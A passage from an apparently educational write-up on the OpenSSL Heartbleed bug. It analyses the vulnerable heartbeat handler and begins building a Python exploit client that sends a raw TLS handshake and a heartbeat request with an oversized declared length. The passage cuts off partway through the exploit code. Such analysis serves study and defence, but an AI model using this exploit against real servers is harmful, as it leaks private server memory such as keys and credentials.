</span></span><span style="display:flex;"><span>	pl <span style="color:#f92672">=</span> p;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (s<span style="color:#f92672">-&gt;</span>msg_callback)
</span></span><span style="display:flex;"><span>		s<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">msg_callback</span>(<span style="color:#ae81ff">0</span>, s<span style="color:#f92672">-&gt;</span>version, TLS1_RT_HEARTBEAT,
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">&amp;</span>s<span style="color:#f92672">-&gt;</span>s3<span style="color:#f92672">-&gt;</span>rrec.data[<span style="color:#ae81ff">0</span>], s<span style="color:#f92672">-&gt;</span>s3<span style="color:#f92672">-&gt;</span>rrec.length,
</span></span><span style="display:flex;"><span>			s, s<span style="color:#f92672">-&gt;</span>msg_callback_arg);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hbtype <span style="color:#f92672">==</span> TLS1_HB_REQUEST)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer, <span style="color:#f92672">*</span>bp;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> r;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* Allocate memory for the response, size is 1 bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * message type, plus 2 bytes payload length, plus
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * payload, plus padding
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 */</span>
</span></span><span style="display:flex;"><span>		buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">OPENSSL_malloc</span>(<span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> padding);
</span></span><span style="display:flex;"><span>		bp <span style="color:#f92672">=</span> buffer;
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* Enter response type, length and copy payload */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">*</span>bp<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> TLS1_HB_RESPONSE;
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">s2n</span>(payload, bp);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">memcpy</span>(bp, pl, payload);
</span></span><span style="display:flex;"><span>		bp <span style="color:#f92672">+=</span> payload;
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* Random padding */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">RAND_pseudo_bytes</span>(bp, padding);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		r <span style="color:#f92672">=</span> <span style="color:#a6e22e">ssl3_write_bytes</span>(s, TLS1_RT_HEARTBEAT, buffer, <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> padding);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (r <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> s<span style="color:#f92672">-&gt;</span>msg_callback)
</span></span><span style="display:flex;"><span>			s<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">msg_callback</span>(<span style="color:#ae81ff">1</span>, s<span style="color:#f92672">-&gt;</span>version, TLS1_RT_HEARTBEAT,
</span></span><span style="display:flex;"><span>				buffer, <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> padding,
</span></span><span style="display:flex;"><span>				s, s<span style="color:#f92672">-&gt;</span>msg_callback_arg);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">OPENSSL_free</span>(buffer);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (r <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> r;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (hbtype <span style="color:#f92672">==</span> TLS1_HB_RESPONSE)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> seq;
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* We only send sequence numbers (2 bytes unsigned int),
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * and 16 random bytes, so we just try to read the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * sequence number */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">n2s</span>(pl, seq);
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (payload <span style="color:#f92672">==</span> <span style="color:#ae81ff">18</span> <span style="color:#f92672">&amp;&amp;</span> seq <span style="color:#f92672">==</span> s<span style="color:#f92672">-&gt;</span>tlsext_hb_seq)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>			s<span style="color:#f92672">-&gt;</span>tlsext_hb_seq<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>			s<span style="color:#f92672">-&gt;</span>tlsext_hb_pending <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></div><p>At first, the function obtains the HeartbeatMeassage address from the TLS record, and declares a pointer for the payload or the actual data within the heartbeat message called <code>pl</code>. Also, three others variables are declared for the heartbeat message type, the length of the payload, and the padding length:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>s<span style="color:#f92672">-&gt;</span>s3<span style="color:#f92672">-&gt;</span>rrec.data[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">*</span>pl;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> hbtype;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> payload;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>; <span style="color:#75715e">/* Use minimum padding */</span>
</span></span></code></pre></div><p>The function starts reading the heartbeat message type and makes the <code>pl</code> points to the content of the message or the heartbeat payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>hbtype <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>p<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">n2s</span>(p, payload);
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> p;
</span></span></code></pre></div><p><code>n2s</code> is a macro defined as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#define n2s(c,s)    ((s=(((unsigned int)((c)[0]))&lt;&lt; 8)| \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                    (((unsigned int)((c)[1]))    )),c+=2)
</span></span></span></code></pre></div><p>It converts 2 bytes from network order byte or big-endian format to little-endian format. <strong>We have to pay attention to this point when developing the exploit</strong>. After that, the macro moves the pointer to point what after those 2 bytes. That&rsquo;s why the <code>p</code> pointer is assigned to the <code>pl</code> directly (<code>pl = p;</code>).</p>
<p>The function has two cases for handling them, either HeatbeatRequest or HeartbeatResponse. In response cases, it sets some states indicating that everything going well and we don’t have to terminate the session. The problem occurs in the second case when receiving heartbeat requests. Let’s analyze that part:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">OPENSSL_malloc</span>(<span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> padding);
</span></span><span style="display:flex;"><span>bp <span style="color:#f92672">=</span> buffer;
</span></span></code></pre></div><p>A heap chunk is allocated to respond to the request, and a temporary pointer called <code>bp</code> is utilized to build the heartbeat response message. The chunk size is calculated as follows: one for the heartbeat message type plus two bytes that hold the payload length plus the length of the payload itself. Notice that the payload length is the same as the request payload length, In addition to the padding length.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">*</span>bp<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> TLS1_HB_RESPONSE;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s2n</span>(payload, bp);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(bp, pl, payload);
</span></span><span style="display:flex;"><span>bp <span style="color:#f92672">+=</span> payload;
</span></span></code></pre></div><p>The type of heartbeat message, which is the HeartbeatResponse, is written in the first byte. Then, the payload length is converted again into network order (bin-endian format) and written in the two bytes next to the type. The same payload (<code>pl</code>) received from the peer is written to the message, and bp jumps to point what after the payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">RAND_pseudo_bytes</span>(bp, padding);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> <span style="color:#a6e22e">ssl3_write_bytes</span>(s, TLS1_RT_HEARTBEAT, buffer, <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> padding);
</span></span></code></pre></div><p>Random bytes will be written to the message for padding, and the message will be sent to the peer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">OPENSSL_free</span>(buffer);
</span></span></code></pre></div><p>The function safely deallocates the heap chunk after the process is completed.</p>
<h3 id="heartbeat-attacking-plan">Heartbeat attacking plan</h3>
<p>At first glance, I thought of heap-based buffer overflow, because if we build a heartbeat request with a large payload and the payload length is set to a lower value, it may lead to overflow. Moreover, there are function pointers everywhere within the heap, as we’ve seen in the analysis phase, if we could target one of them, we might be able to remotely execute arbitrary code on the peer machine whether it is a server or client. Unfortunately, this function ignores any data outside the specified length range.</p>
<p>Also, the function is safe against <strong>UAF</strong> bugs since the heap chunk starts and ends at the same scope. The chunk address isn’t saved somewhere for later use.</p>
<p>This endpoint would be ideal for doing heap spray attacks since we can force the peer to allocate a chunk with a specific length and put the data we control within that chunk, if this technique is combined with another <strong>UAF</strong> bug in the library, the exploit would be very effective. Unfortunately, the function gets rid of that chunk at the end of it, and there is no memory leak bug at this point.</p>
<p>The first fact that caught my attention in the function responsible for handling heartbeats is that the Heartbeat protocol implementation does not follow the standards. According to <a href="https://datatracker.ietf.org/doc/html/rfc6520#section-4">RFC6520</a>, &ldquo;If the payload_length of a received HeartbeatMessage is too large, the received HeartbeatMessage MUST be discarded silently.&rdquo; this is not handled yet.</p>
<center><img src="/imgs/tls_heartbeat_bor.png" width="784" height="464" /></center>
<p>As shown in the picture, the library copies the same payload received within the request <strong>depending on the payload length specified in the received message</strong>. Since we can specify the length we want in the packet we send without any restrictions or verification from the receiver of the message, we can force the other peer to leak memory adjacent to the buffer we are reading from by specifying a length greater than the actual size of the payload. Also, every time the <code>OPENSSL_malloc</code> function is called, it will give us a different address in the heap memory. This means that we can leak different data if we send multiple heartbeat requests.</p>
<h3 id="heartbeat-exploitation">Heartbeat exploitation</h3>
<p>We have analyzed and planned well. It is time for exploitation. Let us bleed the heart. I will build my exploit as a client to attack servers but the approach is the same in all cases. The exploit begins with initializing a TLS client as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tls_init_client</span>():
</span></span><span style="display:flex;"><span>    sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket( socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        sock<span style="color:#f92672">.</span>connect( (TARGET, PORT) )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        print_error(<span style="color:#e6db74">&#34;Target server is unreachable&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> tls_handshake(sock):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sock
</span></span></code></pre></div><p>It uses a normal socket connection, doing a handshake, and if it has succeeded, it will return the connection to the caller.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tls_handshake</span>(sock):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># https://datatracker.ietf.org/doc/html/rfc5246#section-7.4.1.2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print_status(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Starting negotiation with &#39;</span><span style="color:#e6db74">{</span>TARGET<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># TLS Headers</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x16</span><span style="color:#e6db74">&#34;</span>            <span style="color:#75715e"># Content type (handshake)</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x02</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># TLS version (major, minor)</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xdc</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># TLS message length</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Handshake header</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span>            <span style="color:#75715e"># ClientHello type</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\xd8</span><span style="color:#e6db74">&#34;</span>    <span style="color:#75715e"># Handshake message length</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ClientHello message</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x02</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># TLS server version</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># The current time and date in standard UNIX 32-bit format</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;I&#34;</span>, int(time<span style="color:#f92672">.</span>mktime(datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>utcnow()<span style="color:#f92672">.</span>timetuple()))) 
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> random<span style="color:#f92672">.</span>randbytes(<span style="color:#ae81ff">28</span>)   <span style="color:#75715e"># 28 random bytes</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>                <span style="color:#75715e"># Session ID</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Cipher suites </span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x66</span><span style="color:#e6db74">&#34;</span>            <span style="color:#75715e"># Length</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\x14\xc0\x0a\xc0\x22\xc0\x21\x00\x39</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x38\x00\x88\x00\x87\xc0\x0f\xc0\x05\x00\x35\x00\x84\xc0\x12</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x0d\xc0\x03\x00\x0a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\x13\xc0\x09\xc0\x1f\xc0\x1e\x00\x33\x00\x32\x00\x9a\x00\x99</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x45\x00\x44\xc0\x0e\xc0\x04\x00\x2f\x00\x96\x00\x41\xc0\x11</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x09</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Compression</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># Length</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># We don&#39;t need any compression</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Extensions</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x49</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># Length</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0b\x00\x04\x03\x00\x01\x02</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0a\x00\x34\x00\x32\x00\x0e</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0d\x00\x19\x00\x0b\x00\x0c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x18\x00\x09\x00\x0a\x00\x16</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x17\x00\x08\x00\x06\x00\x07</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x14\x00\x15\x00\x04\x00\x05</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x12\x00\x13\x00\x01\x00\x02</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x03\x00\x0f\x00\x10\x00\x11</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x23\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0f\x00\x01\x01</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print_status(<span style="color:#e6db74">&#34;Sending handshake hello message&#34;</span>)
</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>send(hello)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        rtype, tls_ver, handshake <span style="color:#f92672">=</span> tls_record_recv(sock)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> rtype:
</span></span><span style="display:flex;"><span>            print_error(<span style="color:#e6db74">&#34;Something goes wrong in negotioation!&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> rtype <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x16</span> <span style="color:#f92672">and</span> handshake[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0E</span>:
</span></span><span style="display:flex;"><span>            print_success(<span style="color:#e6db74">&#34;The handshake has been done successfully&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> tls_ver <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0301</span>:
</span></span><span style="display:flex;"><span>                print_status(<span style="color:#e6db74">&#34;TLS server version = v1.0&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> tls_ver <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0302</span>:
</span></span><span style="display:flex;"><span>                print_status(<span style="color:#e6db74">&#34;TLS server version = v1.1&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> tls_ver <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0303</span>:
</span></span><span style="display:flex;"><span>                print_status(<span style="color:#e6db74">&#34;TLS server version = v1.2&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span></code></pre></div><p>We avoid using something like <code>ssl.wrap_socket</code> because it will do complex things like handling certificates and configuring TLS. Furthermore, it will put us at a higher abstraction layer, taking control from us. We need to control everything at the lowest level, which is why we implement the protocol ourselves. Also, we want to trigger the bug with minimal effort and without getting into complications that might cause the attack to fail.</p>
<p>This function constructs a handshake hello message based on the description of <a href="https://datatracker.ietf.org/doc/html/rfc5246#section-7.4.1.2">RFC5246</a>, and sends it to the server, then it receives the server response, and based on the server&rsquo;s response, it returns either true or false, indicating whether the handshake was successful.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tls_heartbleed</span>(sock):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># https://datatracker.ietf.org/doc/html/rfc6520#section-4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18</span><span style="color:#e6db74">&#34;</span>       <span style="color:#75715e"># Heartbeat type</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x02</span><span style="color:#e6db74">&#34;</span>   <span style="color:#75715e"># TLS version (major, minor)</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x21</span><span style="color:#e6db74">&#34;</span>   <span style="color:#75715e"># Heartbeat length</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span>       <span style="color:#75715e"># HeartbeatRequest (type)</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;H&#34;</span>, LENGTH <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x03</span>) <span style="color:#75715e"># &lt;-- f*cker (badlength - padding - hdrsize)</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x30\x78\x4e\x69\x6e\x6a\x61\x43\x79\x63\x6c\x6f\x6e\x65</span><span style="color:#e6db74">&#34;</span>
